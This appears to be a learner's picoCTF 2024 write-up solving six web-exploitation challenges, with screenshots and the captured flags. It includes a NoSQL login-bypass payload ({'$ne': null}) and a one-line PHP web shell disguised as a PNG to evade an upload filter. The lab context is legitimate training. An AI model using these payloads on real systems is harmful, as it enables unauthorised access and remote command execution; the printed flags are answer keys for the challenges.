# Web exploitation 

## Bookmarklet

![317676396-8d825340-782c-4b14-9c5c-69f15e85d46b](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/c6c9dfe5-b477-417f-8ef3-de61cd71b038)

- open the website we seem it's have the javascript code may be is the decryption the flag

![317678646-191c827f-01f0-4b59-b362-e2fb441c1eaa](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/a0c748c5-31a5-41f2-9194-121367e84949)

- we will run that code in the javascript online 

![317678505-d8ab3155-189a-4261-a934-aed4d37f53d0](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/7c55d690-52e5-429f-b9a8-70f8605231f7)

=> flag: picoCTF{p@g3_turn3r_6bbf8953}

## WebDecode

![317946645-2adeb885-302e-416e-9709-1d798367adc9](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/027156b0-8cbd-4701-af93-613fa989d72c)

- open the terminal and i have to see the source code of this web site it's might be have some path for me to see

Recon 

![317947573-61c93ad9-9a2a-40b5-a2d2-3efaa1ec1561](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/61ded783-e45c-4d59-aaae-6a639ad5b70e)


![317947689-c0c98a8a-439e-453c-acad-dbfc81b0c43b](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/e25f7703-e139-455b-acf0-2b65a9e3cdbb)

- we could see the source code have and the hint told us to navigate that i think it could in the navigate container card

- we keep digging each of that link html till i found the about.html

![317948044-2042c721-5969-4229-b71c-4a9b60f256fd](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/ecee3c5c-dd72-4616-8e8f-83d66e34d612)


- i think it might be base64 encode solve we decode it and we have

![317948188-aa82d745-1b81-45fd-a8a3-6b043165850d](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/4abe14d8-c0d2-4fcf-ac05-fa08f410599d)


=> flag: picoCTF{web_succ3ssfully_d3c0ded_1f832615}

## Unminify

![317948287-f21acd83-3373-4588-817a-77a2d6a9a252](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/ac0c4cb1-c431-4129-9bf9-7b68467d809f)


Recon 

- ctrl + u  and see source code and to find this all we have to do is trying to grep the picoctf cause the source code kind of messy

- i using inspector to see each of part card in the html website after i search i found the flag

![318150980-37d716be-f3f3-49b9-bef8-13085cdf56a1](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/4fdfcb2b-c171-44c9-85df-3e2ca0072366)

=> flag : picoCTF{pr3tty_c0d3_51d374f0}

## introtobrup 

![318151931-be2d881e-9064-47c5-87c7-11072ed110ba](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/95ba7c7f-e10f-47f1-b074-c9fbed51093a)

Recon 

- to solve this part we should using brupsuite to see the request
 
- after input the account from user we can see that otp is have from the method post

![319873027-2998d786-4ef8-4d77-961a-c691b1dedae4](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/357594d1-65c2-4144-8116-e93e0b7efd15)


hint:
Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.

=> so we try to changing the request from get to post so we can see the flag 

![319872951-e14117f0-056a-4879-83e8-cbc714b17e6d](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/c28d63bf-13b2-4b55-acf2-815f6b461ccb)

=> flag: picoCTF{#0TP_Bypvss_SuCc3$S_6bffad21}

## Nosql injection 

![319917402-e33334d5-edc8-46eb-9a9e-f7a2673fdf5e](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/e5879775-dccb-40d0-be9b-d7aa3dde7874)


Recon

- in this web we know this is the nosql injection exploit but how we can solve this first we need to download the script app from this web

- first i don't just locate the src code is from the login path so i need to find it and it's name route.ts file

![319919429-7ab95975-b3d4-463c-9648-001d54bc02e0](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/56014c5c-b943-4eec-b599-e48f2a8629ba)

- i search the payload from the link:

https://book.hacktricks.xyz/pentesting-web/nosql-injection

- so i we know the code mention with the payload is the way to bypass that we using json strings

![319920180-4cb3dab7-fd76-4462-8bc2-195bad1f3c05](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/c78a492c-6b39-47cd-af48-8f31581f348a)


- back to login we test the first payload with

{"$ne": null}

i put in each email and password 

![319921024-f14150ec-aa2a-4794-a1e9-dc4bba1e6ccd](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/b1ae4d3b-7f54-44cf-ac6c-5f34f37534d8)


- we see when they handle the payload we can see the request process has been add the backslash

![319928684-1d450973-ac24-4382-afec-88a84957a7de](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/178e2c6a-b62f-42b6-a9c1-c1f93eed0d74)



![319932297-c78183b2-ed3d-46cf-b05d-a2ae0a523400](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/c32bfe2a-b667-4621-99ac-675b6281f5ac)

- it's require "{" because if we not using the blackslash that bracket would become the value so we need the \ to make sure it part of json strings

![319937595-cfca9195-179c-456a-9e32-6fe9eaf814c9](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/368c94bf-8fdf-4426-a077-335effcd690a)


=> token so we identify as the base64 decode

after decode we have

=> flag: picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_af67328d}

## trickster

![319966995-aa179dbc-5011-4501-bbd7-bc1f664191da](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/2e42eaea-d347-4434-8ebd-11398d71a0d7)

- we have the web upload the point of this that we need to upload the web shell to find the flag

Recon

- frist create an web shell we have

![319967606-54bf0e49-59b9-4d05-ba5e-38b18110f1f8](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/98725ef5-518b-4b5c-af4a-2e1bedc298b4)

``` <?php system($_GET['cmd']);?> ``` 

to handle the command and managing directory on web server 

![319968505-bed1e8e0-768a-4d84-84f0-019c4b31dbf9](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/692201c5-cd9d-4f0b-8bc6-a7aabcb8e730)


- we get missing .png on the file so we config that and test again

![319968809-21a8992c-cf38-439e-82d1-c35e72dcb69e](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/0bcdca41-560e-4bdb-aac8-bede326f0d9b)

- it seem we have some problem in hex image of my file so i need to search for that and i found the problem

- after i scan my web usin brupsuite pro i found the robots.txt and have an instructions.txt

![319969568-49ea844e-e542-4304-ae4a-88c7ad4969c5](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/6cf6d7e0-d5fb-4821-bf3d-a6ea590e93af)


- i found the problem in the magic bytes dosen't valid so i search to bypass and config my file

 ![319969884-54b289d4-9c6a-424c-a473-c97fe2fdc91a](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/811726d3-3ba3-41b1-baa9-ddbdf1099838)


- so i put on the start of my code for next valid image png

![319970326-99d9d879-b577-4952-8c09-fe500e409a0e](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/57ae90c1-e2e3-4990-b728-da513f14c47f)


it's oke but 

![319970528-06b497d3-c18d-43ac-99e1-2939a6e9b179](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/f9575ea9-7e5e-4da3-98db-93e5a93fcc80)


- this error because file format actualy is php but it's just modifile on web is wrong so i fix then it's oke


![319971471-67d290d3-3f86-4b8a-b592-203648f06e6a](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/55289c8b-3b85-4a0a-8181-fa9369c63400)


there it's access on the image so i will control it's through url using ?cmd= 

- becase this web shell start with /var/www/html using ls -la list all the current dir we see ..

![319972698-827b62d7-1aa3-497f-923d-bf021ae3027d](https://github.com/neo-M3tinez/picoctf2024/assets/174318737/3ea4483c-e62b-4b28-ad08-59043ced569e)

=> we found the flag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}
